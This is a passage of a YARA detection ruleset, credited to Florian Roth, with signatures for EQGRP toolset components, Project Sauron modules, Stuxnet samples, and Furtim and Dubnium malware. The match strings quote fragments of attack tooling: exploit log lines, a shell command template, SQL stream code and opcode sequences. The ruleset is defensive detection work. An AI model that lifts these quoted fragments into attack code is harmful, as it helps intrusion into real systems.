https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"630d464b1d08c4dfd0bd50552bee2d6a591fb0b5597ecebaa556a3c3d4e0aa4e\"\n      hash2 = \"07f4c60505f4d5fb5c4a76a8c899d9b63291444a3980d94c06e1d5889ae85482\"\n      tags = \"APT, DEMO, SCRIPT, T1021_004\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"received prompt, we're in\" fullword ascii\n      $s2 = \"failed to login, bad creds, abort\" fullword ascii\n      $s3 = \"sending command \\\" + str(n) + \\\"/\\\" + str(tot) + \\\", len \\\" + str(len(chunk) + \" fullword ascii\n      $s4 = \"received nat - EPBA: ok, payload: mangled, did not run\" fullword ascii\n      $s5 = \"no status returned from target, could be an exploit failure, or this is a version where we don't expect a stus return\" ascii\n      $s6 = \"received arp - EPBA: ok, payload: fail\" fullword ascii\n      $s7 = \"chopped = string.rstrip(payload, \\\"\\\\x0a\\\")\" fullword ascii\n   condition: \n      ( filesize < 10KB and 2 of them ) or ( 3 of them )\n}\n\nrule APT_EQGRP_Extrabacon_Output_RID312A : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - Extrabacon exploit output\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 13:10:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"|###[ SNMPresponse ]###\" fullword ascii\n      $s2 = \"[+] generating exploit for exec mode pass-disable\" fullword ascii\n      $s3 = \"[+] building payload for mode pass-disable\" fullword ascii\n      $s4 = \"[+] Executing:  extrabacon\" fullword ascii\n      $s5 = \"appended AAAADMINAUTH_ENABLE payload\" fullword ascii\n   condition: \n      2 of them\n}\n\nrule APT_EQGRP_noclient_3_0_5_RID2F44 : APT DEMO FILE {\n   meta:\n      description = \"Detects tool from EQGRP toolset - file noclient-3.0.5.3\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-15 11:49:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"-C %s 127.0.0.1\\\" scripme -F -t JACKPOPIN4 '&\" fullword ascii\n      $x2 = \"Command too long!  What the HELL are you trying to do to me?!?!  Try one smaller than %d bozo.\" fullword ascii\n      $x3 = \"sh -c \\\"ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx \\\"\" fullword ascii\n      $x4 = \"Error from ourtn, did not find keys=target in tn.spayed\" fullword ascii\n      $x5 = \"ourtn -d -D %s -W 127.0.0.1:%d  -i %s -p %d %s %s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 700KB and 1 of them ) or ( all of them )\n}\n\nrule APT_EQGRP_installdate_RID2EC8 : APT DEMO {\n   meta:\n      description = \"Detects tool from EQGRP toolset - file installdate.pl\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-15 11:29:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"#Provide hex or EP log as command-line argument or as input\" fullword ascii\n      $x2 = \"print \\\"Gimme hex: \\\";\" fullword ascii\n      $x3 = \"if ($line =~ /Reg_Dword:  (\\\\d\\\\d:\\\\d\\\\d:\\\\d\\\\d.\\\\d+ \\\\d+ - )?(\\\\S*)/) {\" fullword ascii\n      $s1 = \"if ($_ =~ /InstallDate/) {\" fullword ascii\n      $s2 = \"if (not($cmdInput)) {\" fullword ascii\n      $s3 = \"print \\\"$hex in decimal=$dec\\\\n\\\\n\\\";\" fullword ascii\n   condition: \n      filesize < 2KB and ( 1 of ( $x* ) or 3 of them )\n}\n\nrule APT_EQGRP_teflondoor_RID2E6F : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects tool from EQGRP toolset - file teflondoor.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-15 11:14:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%s: abort.  Code is %d.  Message is '%s'\" fullword ascii\n      $x2 = \"%s: %li b (%li%%)\" fullword ascii\n      $s1 = \"no winsock\" fullword ascii\n      $s2 = \"%s: %s file '%s'\" fullword ascii\n      $s3 = \"peer: connect\" fullword ascii\n      $s4 = \"read: write\" fullword ascii\n      $s5 = \"%s: done!\" fullword ascii\n      $s6 = \"%s: %li b\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 1 of ( $x* ) and 3 of them\n}\n\nrule APT_EQGRP_durablenapkin_solaris_2_0_1_RID349F : APT DEMO FILE {\n   meta:\n      description = \"Detects tool from EQGRP toolset - file durablenapkin.solaris.2.0.1.1\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-15 15:38:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"recv_ack: %s: Service not supplied by provider\" fullword ascii\n      $s2 = \"send_request: putmsg \\\"%s\\\": %s\" fullword ascii\n      $s3 = \"port undefined\" fullword ascii\n      $s4 = \"recv_ack: %s getmsg: %s\" fullword ascii\n      $s5 = \">> %d -- %d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 40KB and 2 of them )\n}\n\nrule APT_EQGRP_teflonhandle_RID2F27 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects tool from EQGRP toolset - file teflonhandle.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-15 11:45:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s [infile] [outfile] /k 0x[%i character hex key] </g>\" fullword ascii\n      $s2 = \"File %s already exists.  Overwrite? (y/n) \" fullword ascii\n      $s3 = \"Random Key : 0x\" fullword ascii\n      $s4 = \"done (%i bytes written).\" fullword ascii\n      $s5 = \"%s --> %s...\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and 2 of them\n}\n\nrule APT_EQGRP_false_RID2C3E : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects tool from EQGRP toolset - file false.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-15 09:40:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = { 00 25 64 2E 0A 00 00 00 00 25 64 2E 0A 00 00 00\n         00 25 6C 75 2E 25 6C 75 2E 25 6C 75 2E 25 6C 75\n         00 25 64 2E 0A 00 00 00 00 25 64 2E 0A 00 00 00\n         00 25 64 2E 0A 00 00 00 00 25 64 2E 0A 00 00 00\n         00 25 32 2E 32 58 20 00 00 0A 00 00 00 25 64 20\n         2D 20 25 64 20 25 64 0A 00 25 64 0A 00 25 64 2E\n         0A 00 00 00 00 25 64 2E 0A 00 00 00 00 25 64 2E\n         0A 00 00 00 00 25 64 20 2D 20 25 64 0A 00 00 00\n         00 25 64 20 2D 20 25 64 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and $s1\n}\n\nrule APT_EQGRP_dn_1_0_2_1_RID2D45 : APT DEMO FILE LINUX {\n   meta:\n      description = \"Detects tool from EQGRP toolset - file dn.1.0.2.1.linux\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-15 10:24:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, LINUX\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Valid commands are: SMAC, DMAC, INT, PACK, DONE, GO\" fullword ascii\n      $s2 = \"invalid format suggest DMAC=00:00:00:00:00:00\" fullword ascii\n      $s3 = \"SMAC=%02x:%02x:%02x:%02x:%02x:%02x\" fullword ascii\n      $s4 = \"Not everything is set yet\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 2 of them )\n}\n\nrule APT_EQGRP_morel_RID2C52 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects tool from EQGRP toolset - file morel.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-15 09:44:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a9152e67f507c9a179bb8478b58e5c71c444a5a39ae3082e04820a0613cd6d9f\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%d - %d, %d\" fullword ascii\n      $s2 = \"%d - %lu.%lu %d.%lu\" fullword ascii\n      $s3 = \"%d - %d %d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them )\n}\n\nrule APT_EQGRP_bc_parser_RID2DE4 : APT DEMO FILE {\n   meta:\n      description = \"Detects tool from EQGRP toolset - file bc-parser\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-15 10:51:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"879f2f1ae5d18a3a5310aeeafec22484607649644e5ecb7d8a72f0877ac19cee\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"*** Target may be susceptible to FALSEMOREL      ***\" fullword ascii\n      $s2 = \"*** Target is susceptible to FALSEMOREL          ***\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x457f and 1 of them\n}\n\nrule APT_EQGRP_1212_RID2AF9 : APT DEMO {\n   meta:\n      description = \"Detects tool from EQGRP toolset - file 1212.pl\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-15 08:46:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if (!(($srcip,$dstip,$srcport,$dstport) = ($line=~/^([a-f0-9]{8})([a-f0-9]{8})([a-f0-9]{4})([a-f0-9]{4})$/)))\" fullword ascii\n      $s2 = \"$ans=\\\"$srcip:$srcport -> $dstip:$dstport\\\";\" fullword ascii\n      $s3 = \"return \\\"ERROR:$line is not a valid port\\\";\" fullword ascii\n      $s4 = \"$dstport=hextoPort($dstport);\" fullword ascii\n      $s5 = \"sub hextoPort\" fullword ascii\n      $s6 = \"$byte_table{\\\"$chars[$sixteens]$chars[$ones]\\\"}=$i;\" fullword ascii\n   condition: \n      filesize < 6KB and 4 of them\n}\n\nrule APT_EQGRP_1212_dehex_RID2D66 : APT DEMO FILE {\n   meta:\n      description = \"Detects tool from EQGRP toolset - from files 1212.pl, dehex.pl\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-15 10:30:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"return \\\"ERROR:$line is not a valid address\\\";\" fullword ascii\n      $s2 = \"print \\\"ERROR: the filename or hex representation needs to be one argument try using \\\\\\\"'s\\\\n\\\";\" fullword ascii\n      $s3 = \"push(@octets,$byte_table{$tempi});\" fullword ascii\n      $s4 = \"$byte_table{\\\"$chars[$sixteens]$chars[$ones]\\\"}=$i;\" fullword ascii\n      $s5 = \"print hextoIP($ARGV[0]);\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 6KB and ( 5 of ( $s* ) ) ) or ( all of them )\n}\n\nrule APT_Project_Sauron_arping_module_RID33C8 : APT DEMO G0041 {\n   meta:\n      description = \"Detects strings from arping module - Project Sauron report by Kaspersky\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/faq-the-projectsauron-apt/75533/\"\n      date = \"2016-08-08 15:02:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"APT, DEMO, G0041\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Resolve hosts that answer\" \n      $s2 = \"Print only replying Ips\" \n      $s3 = \"Do not display MAC addresses\" \n   condition: \n      all of them\n}\n\nrule APT_Project_Sauron_kblogi_module_RID33BF : APT DEMO G0041 {\n   meta:\n      description = \"Detects strings from kblogi module - Project Sauron report by Kaspersky\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/faq-the-projectsauron-apt/75533/\"\n      date = \"2016-08-08 15:01:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"APT, DEMO, G0041\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Inject using process name or pid. Default\" \n      $s2 = \"Convert mode: Read log from file and convert to text\" \n      $s3 = \"Maximum running time in seconds\" \n   condition: \n      $x1 or 2 of them\n}\n\nrule APT_Project_Sauron_basex_module_RID335A : APT DEMO G0041 {\n   meta:\n      description = \"Detects strings from basex module - Project Sauron report by Kaspersky\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/faq-the-projectsauron-apt/75533/\"\n      date = \"2016-08-08 14:44:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"APT, DEMO, G0041\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"64, 64url, 32, 32url or 16.\" \n      $s2 = \"Force decoding when input is invalid/corrupt\" \n      $s3 = \"This cruft\" \n   condition: \n      $x1 or 2 of them\n}\n\nrule APT_Project_Sauron_dext_module_RID32FC : APT DEMO G0041 {\n   meta:\n      description = \"Detects strings from dext module - Project Sauron report by Kaspersky\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/faq-the-projectsauron-apt/75533/\"\n      date = \"2016-08-08 14:28:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"APT, DEMO, G0041\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Assemble rows of DNS names back to a single string of data\" \n      $x2 = \"removes checks of DNS names and lengths (during split)\" \n      $x3 = \"Randomize data lengths (length/2 to length)\" \n      $x4 = \"This cruft\" \n   condition: \n      2 of them\n}\n\nrule Hacktool_This_Cruft_RID2EA0 : APT DEMO EXE FILE G0041 {\n   meta:\n      description = \"Detects string 'This cruft' often used in hack tools like netcat or cryptcat and also mentioned in Project Sauron report\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/faq-the-projectsauron-apt/75533/\"\n      date = \"2016-08-08 11:22:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"APT, DEMO, EXE, FILE, G0041\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"This cruft\" fullword\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and $x1 )\n}\n\nrule Typical_Malware_String_Transforms_RID3473 : DEMO EXE FILE HIGHVOL SUSP {\n   meta:\n      description = \"Detects typical strings in a reversed or otherwise modified form\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-07-31 15:31:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, HIGHVOL, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $e1 = \"exe.tsohcvs\" fullword ascii\n      $e2 = \"exe.ssasl\" fullword ascii\n      $e3 = \"exe.rerolpxe\" fullword ascii\n      $e4 = \"exe.erolpxei\" fullword ascii\n      $e5 = \"exe.23lldnur\" fullword ascii\n      $e6 = \"exe.dmc\" fullword ascii\n      $e7 = \"exe.llikksat\" fullword ascii\n      $l1 = \"lld.23lenreK\" fullword ascii\n      $l2 = \"lld.ESABLENREK\" fullword ascii\n      $l3 = \"lld.esabtpyrc\" fullword ascii\n      $l4 = \"lld.trcvsm\" fullword ascii\n      $l5 = \"LLD.LLDTN\" fullword ascii\n      $i1 = \"paeHssecorPteG\" fullword ascii\n      $i2 = \"sserddAcorPteG\" fullword ascii\n      $i3 = \"AyrarbiLdaoL\" fullword ascii\n      $i4 = \"AssecorPetaerC\" fullword ascii\n      $r1 = \"teSlortnoCtnerruC\" fullword ascii\n      $r2 = \"nuR\\\\noisreVtnerruC\" fullword ascii\n      $f1 = \"\\\\23metsys\\\\\" ascii\n      $f2 = \"\\\\23metsyS\\\\\" ascii\n      $f3 = \"niB.elcyceR$\" fullword ascii\n      $f4 = \"%tooRmetsyS%\" fullword ascii\n      $fp1 = \"Application Impact Telemetry Static Analyzer\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and 1 of them and not 1 of ( $fp* ) )\n}\n\nrule APT_Stuxnet_Malware_2_RID2F09 : APT DEMO EXE FILE {\n   meta:\n      description = \"Stuxnet Sample\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-07-09 11:40:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"63e6b8136058d7a06dfff4034b4ab17a261cdf398e63868a601f77ddd1b32802\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\SystemRoot\\\\System32\\\\hal.dll\" wide\n      $s2 = \"http://www.jmicron.co.tw0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 70KB and all of them\n}\n\nrule APT_StuxNet_dll_RID2CCB : APT DEMO EXE FILE {\n   meta:\n      description = \"Stuxnet Sample - file dll.dll\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-07-09 10:04:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9e392277f62206098cf794ddebafd2817483cfd57ec03c2e05e7c3c81e72f562\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SUCKM3 FROM EXPLORER.EXE MOTH4FUCKA #@!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and $s1\n}\n\nrule APT_StuxNet_Malware_1_RID2EE8 : APT DEMO {\n   meta:\n      description = \"Stuxnet Sample - file malware.exe\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-07-09 11:34:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9c891edb5da763398969b6aaa86a5d46971bd28a455b20c2067cb512c9f9a0f8\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 8b 45 08 35 dd 79 19 ae 33 c9 8b 55 08 89 02 89 } \n      $op2 = { 74 36 8b 7f 08 83 ff 00 74 2e 0f b7 1f 8b 7f 04 } \n      $op3 = { 74 70 81 78 05 8d 54 24 04 75 1b 81 78 08 04 cd } \n   condition: \n      all of them\n}\n\nrule APT_Stuxnet_Shortcut_to_RID304D : APT DEMO FILE T1210 T1547_009 {\n   meta:\n      description = \"Stuxnet Sample - file Copy of Shortcut to.lnk\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-07-09 12:34:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"801e3b6d84862163a735502f93b9663be53ccbdd7f12b0707336fecba3a829a2\"\n      tags = \"APT, DEMO, FILE, T1210, T1547_009\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\\\\\.\\\\STORAGE#Volume#_??_USBSTOR#Disk&Ven_Kingston&Prod_DataTraveler_2.0&Rev_PMAP#5B6B098B97BE&0#{53f56307-b6bf-11d0-94f2-00a0c\" wide\n   condition: \n      uint16 ( 0 ) == 0x004c and filesize < 10KB and $x1\n}\n\nrule APT_Stuxnet_Malware_3_RID2F0A : APT DEMO EXE FILE {\n   meta:\n      description = \"Stuxnet Sample - file ~WTR4141.tmp\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-07-09 11:40:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6bcf88251c876ef00b2f32cf97456a3e306c2a263d487b0a50216c6e3cc07c6a\"\n      hash2 = \"70f8789b03e38d07584f57581363afa848dd5c3a197f2483c6dfa4f3e7f78b9b\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"SHELL32.DLL.ASLR.\" fullword wide\n      $s1 = \"~WTR4141.tmp\" fullword wide\n      $s2 = \"~WTR4132.tmp\" fullword wide\n      $s3 = \"totalcmd.exe\" fullword wide\n      $s4 = \"wincmd.exe\" fullword wide\n      $s5 = \"http://www.realtek.com0\" fullword ascii\n      $s6 = \"{%08x-%08x-%08x-%08x}\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and ( $x1 or 3 of ( $s* ) ) ) or ( 5 of them )\n}\n\nrule APT_Stuxnet_maindll_decrypted_unpacked_RID365D : APT DEMO {\n   meta:\n      description = \"Stuxnet Sample - file maindll.decrypted.unpacked.dll_\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-07-09 16:52:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4c3d7b38339d7b8adf73eaf85f0eb9fab4420585c6ab6950ebd360428af11712\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%SystemRoot%\\\\system32\\\\Drivers\\\\mrxsmb.sys;%SystemRoot%\\\\system32\\\\Drivers\\\\*.sys\" fullword wide\n      $s2 = \"<Actions Context=\\\"%s\\\"><Exec><Command>%s</Command><Arguments>%s,#%u</Arguments></Exec></Actions>\" fullword wide\n      $s3 = \"%SystemRoot%\\\\inf\\\\oem7A.PNF\" fullword wide\n      $s4 = \"%SystemRoot%\\\\inf\\\\mdmcpq3.PNF\" fullword wide\n      $s5 = \"%SystemRoot%\\\\inf\\\\oem6C.PNF\" fullword wide\n      $s6 = \"@abf varbinary(4096) EXEC @hr = sp_OACreate 'ADODB.Stream', @aods OUT IF @hr <> 0 GOTO endq EXEC @hr = sp_OASetProperty @\" wide\n      $s7 = \"STORAGE#Volume#1&19f7e59c&0&\" fullword wide\n      $s8 = \"view MCPVREADVARPERCON as select VARIABLEID,VARIABLETYPEID,FORMATFITTING,SCALEID,VARIABLENAME,ADDRESSPARAMETER,PROTOKOLL,MAXLIMI\" ascii\n   condition: \n      6 of them\n}\n\nrule APT_Stuxnet_s7hkimdb_RID2EC8 : APT DEMO EXE FILE {\n   meta:\n      description = \"Stuxnet Sample - file s7hkimdb.dll\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-07-09 11:29:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4071ec265a44d1f0d42ff92b2fa0b30aafa7f6bb2160ed1d0d5372d70ac654bd\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"S7HKIMDX.DLL\" fullword wide\n      $op1 = { 8b 45 08 35 dd 79 19 ae 33 c9 8b 55 08 89 02 89 } \n      $op2 = { 74 36 8b 7f 08 83 ff 00 74 2e 0f b7 1f 8b 7f 04 } \n      $op3 = { 74 70 81 78 05 8d 54 24 04 75 1b 81 78 08 04 cd } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and $x1 and all of ( $op* ) )\n}\n\nrule Furtim_nativeDLL_RID2D4A : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Furtim malware - file native.dll\"\n      author = \"Florian Roth\"\n      reference = \"MISP 3971\"\n      date = \"2016-06-13 10:25:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4f39d3e70ed1278d5fa83ed9f148ca92383ec662ac34635f7e56cc42eeaee948\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"FqkVpTvBwTrhPFjfFF6ZQRK44hHl26\" fullword ascii\n      $op0 = { e0 b3 42 00 c7 84 24 ac } \n      $op1 = { a1 e0 79 44 00 56 ff 90 10 01 00 00 a1 e0 79 44 } \n      $op2 = { bf d0 25 44 00 57 89 4d f0 ff 90 d4 02 00 00 59 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and $s1 or all of ( $op* )\n}\n\nrule Dubnium_Sample_1_RID2D36 : DEMO EXE FILE G0012 MAL {\n   meta:\n      description = \"Detects sample mentioned in the Dubnium Report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2016/06/09/reverse-engineering-dubnium-2?source=mmpc\"\n      date = \"2016-06-10 10:22:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"839baf85de657b6d6503b6f94054efa8841f667987a9c805eab94a85a859e1ba\"\n      tags = \"DEMO, EXE, FILE, G0012, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $key1 = \"3b840e20e9555e9fb031c4ba1f1747ce25cc1d0ff664be676b9b4a90641ff194\" fullword ascii\n      $key2 = \"90631f686a8c3dbc0703ffa353bc1fdf35774568ac62406f98a13ed8f47595fd\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule Dubnium_Sample_2_RID2D37 : DEMO EXE FILE G0012 MAL {\n   meta:\n      description = \"Detects sample mentioned in the Dubnium Report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2016/06/09/reverse-engineering-dubnium-2?source=mmpc\"\n      date = \"2016-06-10 10:22:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"5246899b8c74a681e385cbc1dd556f9c73cf55f2a0074c389b3bf823bfc6ce4b\"\n      tags = \"DEMO, EXE, FILE, G0012, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \":*:::D:\\\\:c:~:\" fullword ascii\n      $s2 = \"SPMUVR\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}\n\nrule Dubnium_Sample_5_RID2D3A : DEMO EXE FILE G0012 MAL {\n   meta:\n      description = \"Detects sample mentioned in the Dubnium Report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2016/06/09/reverse-engineering-dubnium-2?source=mmpc\"\n      date = \"2016-06-10 10:22:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"16f0b05d5e8546ab1504b07b0eaa0e8de14bca7c1555fd114c4c1c51d5a4c06b\"\n      hash2 = \"1feaad03f6c0b57f5f5b02aef668e26001e5a7787bb51966d50c8fcf344fb4e8\"\n      hash3 = \"41ecd81bc7df4b47d713e812f2b7b38d3ac4b9dcdc13dd5ca61763a4bf300dcf\"\n      tags = \"DEMO, EXE, FILE, G0012, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$innn[i$[i$^i[e[mdi[m$jf1Wehn[^Whl[^iin_hf$11mahZijnjbi[^[W[f1n$dej$[hn]1[W1ni1l[ic1j[mZjchl$$^he[[j[a[1_iWc[e[\" fullword ascii\n      $s2 = 